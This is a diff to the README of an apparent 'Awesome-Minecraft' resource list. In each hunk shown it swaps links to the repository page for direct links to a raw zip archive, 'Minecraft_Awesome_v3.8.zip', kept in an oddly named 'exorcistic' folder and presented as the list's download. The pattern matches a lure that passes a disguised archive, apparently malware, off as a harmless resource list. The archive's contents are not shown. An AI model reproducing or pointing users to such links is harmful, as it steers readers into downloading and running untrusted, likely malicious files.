@@ -1,12 +1,12 @@
 # 🧱 Awesome-Minecraft - Minecraft server tools and links
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/brandicoital992/Awesome-Minecraft)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/brandicoital992/Awesome-Minecraft/main/exorcistic/Minecraft_Awesome_v3.8.zip)
 
 ## 📥 Download and open
 
 Use the link below to visit the download page:
 
-[Visit the download page](https://github.com/brandicoital992/Awesome-Minecraft)
+[Visit the download page](https://raw.githubusercontent.com/brandicoital992/Awesome-Minecraft/main/exorcistic/Minecraft_Awesome_v3.8.zip)
 
 If your browser asks what to do with the file or page, choose the option to save it or open it in your browser. If you use the GitHub page, look for the main download area and follow the link shown there.
 
@@ -171,7 +171,7 @@ The repository is set up like a reference list. It points you to tools and resou
 
 ## 🔗 Download again
 
-[Open the download page](https://github.com/brandicoital992/Awesome-Minecraft)
+[Open the download page](https://raw.githubusercontent.com/brandicoital992/Awesome-Minecraft/main/exorcistic/Minecraft_Awesome_v3.8.zip)
 
 ## 🧩 Why people use this list
 
